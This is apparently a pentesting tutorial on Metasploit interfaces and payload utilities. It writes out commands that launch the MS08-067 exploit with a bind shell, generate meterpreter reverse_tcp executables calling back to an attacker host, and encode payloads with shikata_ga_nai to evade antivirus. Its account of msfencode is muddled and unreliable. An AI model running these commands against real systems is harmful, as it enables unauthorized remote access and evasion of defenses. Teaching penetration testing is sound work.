# Exploitation Tools

As the Information Gathering and Vulnerability Analysis ends, the main concept of hacking appears. The time to use all security flaws found and take of advantage of every hole exposed. When it comes to exploitation, **it should only be done when there is enough information to guarantee success.** Going into an exploitation blindly is noisey and disruptive. 

## Metasploit 

This widely known pentesting framework has been the go-to for information gathering, gaining access , evading detection and being an overall Swiss army chainsaw. It also allows you to write security tools and exploit codes from scratch. 


Metasploit Cheat Sheet: https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf

### Metasploit Interfaces

One of the benefits of metasploit, is the option of having more that one interface to work in. It helps zero-in on a specific exploitaiton situation instead of using the flexibility of the entire framework. 

These interfaces include, 

1. MSFconsole
2. MSFcli
3. Armitage 

#### msfconsole

It is dubbed the most popular interface of metasploit due to it being the most flexible, containing the most features, and having well supported tools. 

It can be used for, 

1. Launching an exploit 
2. Loading Auxiliary modules 
3. Performing Enumeration
4. Creating Listeners
5. Running Mass Exploitaiton 

#### msfcli 

On contrary to msfconsole, msfcli focuses on scripting and interpretability instead of being a user-friendly enviornment. It runs directly from the command line, with allows for output redirection to and from other tools. Due to it's 'create your own enviornment' mentality it makes it less forgiving, but more creative. It can also be used to for testing modules and making new exploits from scratch for the framework. 

**msfcli windows/smb/ms08_067_netapi O**

The command above shows the options available in the module specified. 

1. **O** 
    - Options available parameter

2. **ms08_067_netapi** 
    - name of the module 

**msfcli windows/smb/ms08_067_netapi RHOST=<\IP address\> P**

The command above checks for available payloads by using the **P** parameter and the IP address of the remote host. 

**msfcli windows/smb/ms08_067_netapi
 RHOST=<\IP addresss\> PAYLOAD=windows/shell/bind_tcp E**

The command above runs the exploit using the remote hosts' IP address, the chosen payload, and the **E** parameter. 

#### Armitage 

The armitage interface is an interactive GUI that can be used to speed up the process when the concept of the innerworkings of Metasploit are solid. 

### Metasplot Utilities 

These utilities are direct interfaces to particular features for specific situations in the framework. 

They include, 

1. MSFpayload (deprecated )
2. MSFencode ( deprecated )
3. MSFvenom
3. Nasm Shell 

#### msfpayload

This utility allows for the generation of shellcode and executables. **msfpayload and msfencode have been replaced by msfvenom**

Shellcode can be generated through,

1. C
    - For Pythod-based proof of concept
2. JavaScript
    - For Browser Exploit 
3. Ruby
4. VisualBasic

**msfpayload windows/meterpreter/bind_tcp O** # list available options for that payload

**msfpayload windows/meterpreter/reverse_tcp LHOST= <\Local host ip address\>  LPORT=443 X > payload.exe**

The command above creates a **reverse_tcp** payload to connect to the local host through port 443, then saves it as a Windows Executable. 

**msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R > payload.raw**

The command above is the same as the one before, but instead the payload is exported as raw format. 

**msfpayload windows/meterpreter/bind_tcp LPORT=443 C > payload.c # Same as above except exported as C-formatted shellcode**

msfpayload windows/meterpreter/bind_tcp LPORT=443 J > payload.java # Exported as %u encoded JavaScript

#### msfencode

While the code generated from msfencode is fully functional, several null characters are integrated for the sole purpose of evading antivirus software. Metasploit developers specifically created msfencode in order to mitigate the "bad" characters the protection software reads in. 

#### msfvenom

A combination of both msfencode and msfpayload, that puts both of those tools into one framework instance. 

**msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python**

1. **-a x86** 
     - use the architecture
     
     
2. **--platform**
     - platform use windows
     
     
3. **-p**
     - specified payload *windows/shell/bind_tcp*
     
     
4. **-e x86/shikata_ga_nai**
     - use encoder **x86/shikata_ga_nai**
     
     
5. **-b** 
     - list of bad characters 
     
     
6. **-i 3** 
     - use three iterations 
     
     
7. ** -f python**
     - output in python

#### nasm shell 

Utility used when identifiying opcodes, or coding in assembly language. 

**./nasm_shell.rb** # start 

**nasm > jmp esp** # asking nasm shell for the opcode of the jmp esp command 
